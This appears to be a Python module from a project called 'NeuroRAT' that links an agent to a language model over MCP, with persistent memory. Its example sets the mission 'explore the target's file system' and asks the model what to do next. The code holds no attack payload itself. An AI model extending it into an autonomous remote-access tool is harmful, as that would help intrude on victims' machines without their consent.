#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Интеграция агента NeuroRAT с Model Context Protocol (MCP)

Этот модуль обеспечивает интеграцию агента с MCP-клиентом, 
позволяя использовать языковые модели и память для автономной работы.
"""

import os
import sys
import json
import time
import logging
import threading
import re
import importlib.util
from typing import Dict, List, Any, Optional, Union, Callable, Tuple
from datetime import datetime
import uuid

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('agent_mcp.log')
    ]
)
logger = logging.getLogger('agent_mcp')

# Пытаемся импортировать MCP клиент
mcp_client_spec = importlib.util.find_spec('mcp_client')
if mcp_client_spec is None:
    # Если модуль не установлен, проверяем наличие локального файла
    if os.path.exists('mcp_client.py'):
        logger.info("Используем локальный mcp_client.py")
        import mcp_client
        from mcp_client import MCPClient
    else:
        logger.error("Не удалось найти модуль mcp_client")
        raise ImportError("Не удалось импортировать модуль mcp_client")
else:
    # Модуль установлен
    from mcp_client import MCPClient

# Пытаемся импортировать модуль памяти агента
agent_memory_spec = importlib.util.find_spec('agent_memory')
has_agent_memory = agent_memory_spec is not None or os.path.exists('agent_memory.py')
if has_agent_memory:
    if os.path.exists('agent_memory.py'):
        import agent_memory
        from agent_memory import AgentMemory
    else:
        from agent_memory import AgentMemory

class AgentMCP:
    """
    Класс для интеграции агента с MCP сервером.
    Обеспечивает взаимодействие с языковыми моделями и управление контекстом.
    """
    
    def __init__(
        self, 
        agent_id: str, 
        mcp_url: str = "http://localhost:8089",
        api_key: Optional[str] = None,
        system_message: str = "",
        default_model: str = "gemini-2.5-pro-preview-03-25",
        memory_db_path: Optional[str] = None
    ):
        """
        Инициализация интеграции агента с MCP
        
        Args:
            agent_id: Уникальный идентификатор агента
            mcp_url: URL MCP сервера
            api_key: API ключ для авторизации на MCP сервере
            system_message: Системное сообщение для настройки поведения модели
            default_model: Модель по умолчанию (по умолчанию Gemini 2.5 Pro Preview)
            memory_db_path: Путь к файлу базы данных для хранения памяти
        """
        self.agent_id = agent_id
        self.system_message = system_message
        self.default_model = default_model
        
        # Инициализация MCP клиента
        self.mcp_client = MCPClient(
            server_url=mcp_url,
            api_key=api_key,
            default_model=default_model
        )
        
        # Инициализация памяти агента
        self.memory = AgentMemory(db_path=memory_db_path or f"agent_memory_{agent_id}.db")
        
        # Идентификатор текущего контекста для общения с моделью
        self.context_id = self._create_or_load_context()
        
        # Блокировка для многопоточного доступа
        self.lock = threading.RLock()
        
        logger.info(f"AgentMCP инициализирован для агента {agent_id} с контекстом {self.context_id}")
    
    def _create_or_load_context(self) -> str:
        """
        Создание или загрузка существующего контекста для агента
        
        Returns:
            Идентификатор контекста
        """
        try:
            # Пытаемся загрузить сохраненный идентификатор контекста из памяти
            context_info = self.memory.get_from_long_term(f"context_id:{self.agent_id}")
            if context_info:
                context_id = context_info["value"]
                logger.info(f"Загружен существующий контекст {context_id}")
                return context_id
        except Exception as e:
            logger.warning(f"Не удалось загрузить существующий контекст: {str(e)}")
        
        # Создаем новый контекст
        context_id = self.mcp_client.create_conversation(self.system_message)
        
        # Сохраняем идентификатор контекста в долговременную память
        self.memory.add_to_long_term(
            key=f"context_id:{self.agent_id}", 
            value=context_id,
            metadata={"created_at": time.time()}
        )
        
        logger.info(f"Создан новый контекст {context_id}")
        return context_id
    
    def query_model(
        self, 
        query: str, 
        model: Optional[str] = None,
        temperature: float = 0.7,
        max_tokens: int = 1000,
        save_to_memory: bool = True,
        memory_category: str = "conversations",
        include_memory: bool = True,
        memory_limit: int = 5
    ) -> Dict[str, Any]:
        """
        Отправка запроса к языковой модели
        
        Args:
            query: Текст запроса к модели
            model: Идентификатор модели (если None, используется default_model, по умолчанию Gemini)
            temperature: Параметр температуры для генерации
            max_tokens: Максимальное количество токенов для генерации
            save_to_memory: Сохранить запрос и ответ в память
            memory_category: Категория для сохранения в памяти
            include_memory: Включать релевантную информацию из памяти в запрос
            memory_limit: Лимит включаемых элементов памяти
            
        Returns:
            Ответ от модели
        """
        with self.lock:
            # Подготовка сообщения
            user_message = query
            
            # Включаем релевантную информацию из памяти, если требуется
            if include_memory:
                relevant_memories = self.memory.search_long_term(
                    query=query,
                    limit=memory_limit
                )
                
                if relevant_memories:
                    memory_text = "\nРелевантная информация из моей памяти:\n"
                    for i, mem in enumerate(relevant_memories, 1):
                        memory_text += f"{i}. {mem['key']}: {mem['value']}\n"
                    
                    user_message = f"{memory_text}\n\nС учетом этой информации, отвечаю на вопрос: {query}"
            
            # Отправка запроса к модели через MCP сервер
            response = self.mcp_client.chat(
                message=user_message,
                context_id=self.context_id,
                model=model or self.default_model,
                temperature=temperature,
                max_tokens=max_tokens
            )
            
            # Если требуется, сохраняем в память
            if save_to_memory and "content" in response:
                interaction_id = str(uuid.uuid4())
                
                # Сохраняем запрос
                self.memory.add_to_long_term(
                    key=f"query:{interaction_id}",
                    value=query,
                    category=memory_category,
                    metadata={
                        "timestamp": time.time(),
                        "interaction_id": interaction_id,
                        "type": "query"
                    }
                )
                
                # Сохраняем ответ
                self.memory.add_to_long_term(
                    key=f"response:{interaction_id}",
                    value=response["content"],
                    category=memory_category,
                    metadata={
                        "timestamp": time.time(),
                        "interaction_id": interaction_id,
                        "type": "response",
                        "model": model or self.default_model
                    }
                )
            
            return response
    
    def clear_context(self) -> bool:
        """
        Очистка текущего контекста разговора с моделью
        
        Returns:
            True, если операция выполнена успешно
        """
        with self.lock:
            try:
                # Очищаем контекст через MCP
                self.mcp_client.clear_context(self.context_id)
                
                # Создаем новый контекст
                new_context_id = self.mcp_client.create_conversation(self.system_message)
                self.context_id = new_context_id
                
                # Обновляем идентификатор в памяти
                self.memory.add_to_long_term(
                    key=f"context_id:{self.agent_id}", 
                    value=new_context_id,
                    metadata={"created_at": time.time()}
                )
                
                logger.info(f"Контекст очищен, создан новый: {new_context_id}")
                return True
                
            except Exception as e:
                logger.error(f"Ошибка при очистке контекста: {str(e)}")
                return False
    
    def add_to_memory(
        self, 
        key: str, 
        value: Any, 
        category: str = "general",
        metadata: Optional[Dict[str, Any]] = None
    ) -> bool:
        """
        Добавление информации в долговременную память агента
        
        Args:
            key: Ключ для хранения информации
            value: Значение для хранения (может быть строкой, числом, списком, словарем)
            category: Категория для организации памяти
            metadata: Дополнительные метаданные
            
        Returns:
            True, если операция выполнена успешно
        """
        try:
            self.memory.add_to_long_term(
                key=key,
                value=value, 
                category=category,
                metadata=metadata or {}
            )
            return True
        except Exception as e:
            logger.error(f"Ошибка при добавлении в память: {str(e)}")
            return False
    
    def get_from_memory(self, key: str) -> Optional[Dict[str, Any]]:
        """
        Получение информации из долговременной памяти агента по ключу
        
        Args:
            key: Ключ для поиска
            
        Returns:
            Словарь с информацией или None, если ключ не найден
        """
        try:
            return self.memory.get_from_long_term(key)
        except Exception as e:
            logger.error(f"Ошибка при получении из памяти: {str(e)}")
            return None
    
    def search_memory(
        self, 
        query: str, 
        category: Optional[str] = None,
        limit: int = 10
    ) -> List[Dict[str, Any]]:
        """
        Поиск информации в долговременной памяти агента
        
        Args:
            query: Текст для поиска
            category: Категория для ограничения поиска (опционально)
            limit: Максимальное количество результатов
            
        Returns:
            Список словарей с найденной информацией
        """
        try:
            return self.memory.search_long_term(
                query=query,
                category=category,
                limit=limit
            )
        except Exception as e:
            logger.error(f"Ошибка при поиске в памяти: {str(e)}")
            return []
    
    def close(self):
        """Корректное завершение работы и сохранение данных"""
        try:
            # Сохраняем память на диск
            self.memory.save_memory()
            logger.info(f"Память агента {self.agent_id} сохранена")
        except Exception as e:
            logger.error(f"Ошибка при завершении работы: {str(e)}")


# Пример использования
if __name__ == "__main__":
    import argparse
    
    # Парсим аргументы командной строки
    parser = argparse.ArgumentParser(description='Интеграция агента с Model Context Protocol (MCP)')
    parser.add_argument('--host', help='MCP server host')
    parser.add_argument('--port', type=int, default=5500, help='MCP server port')
    parser.add_argument('--no-ssl', action='store_true', help='Disable SSL encryption')
    parser.add_argument('--no-verify', action='store_true', help='Disable SSL certificate verification')
    parser.add_argument('--token', help='Authentication token')
    parser.add_argument('--no-local-memory', action='store_true', help='Disable local memory')
    parser.add_argument('--memory-db', default='agent_memory.db', help='Path to local memory database')
    parser.add_argument('--query', help='Query to test model')
    parser.add_argument('--model', default='default', help='Model to use')
    parser.add_argument('--analyze', help='Text to analyze')
    parser.add_argument('--add-memory', help='Add content to memory')
    parser.add_argument('--category', default='general', help='Category for memory item')
    parser.add_argument('--importance', type=int, default=5, help='Importance for memory item (1-10)')
    parser.add_argument('--get-memory', action='store_true', help='Get memory items')
    parser.add_argument('--memory-query', help='Query to filter memory items')
    parser.add_argument('--session-info', action='store_true', help='Show session info')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    # Настройка уровня логирования
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Создаем интеграцию агента с MCP
    agent_mcp = AgentMCP(
        agent_id="test_agent_1",
        mcp_url="http://localhost:8089",
        system_message="Ты помощник агента NeuroRAT. Отвечай кратко и по существу."
    )
    
    # Отправляем запрос к модели
    response = agent_mcp.query_model(
        query="Какие основные задачи автономного агента?",
        temperature=0.7
    )
    
    print(f"Ответ модели: {response['content']}")
    
    # Добавляем информацию в память
    agent_mcp.add_to_memory(
        key="mission:current",
        value="Исследование файловой системы объекта",
        category="mission",
        metadata={"priority": "high", "started_at": time.time()}
    )
    
    # Отправляем запрос с использованием информации из памяти
    response = agent_mcp.query_model(
        query="Что мне сейчас нужно делать?",
        include_memory=True
    )
    
    print(f"Ответ с учетом памяти: {response['content']}")
    
    # Закрываем сессию
    agent_mcp.close() 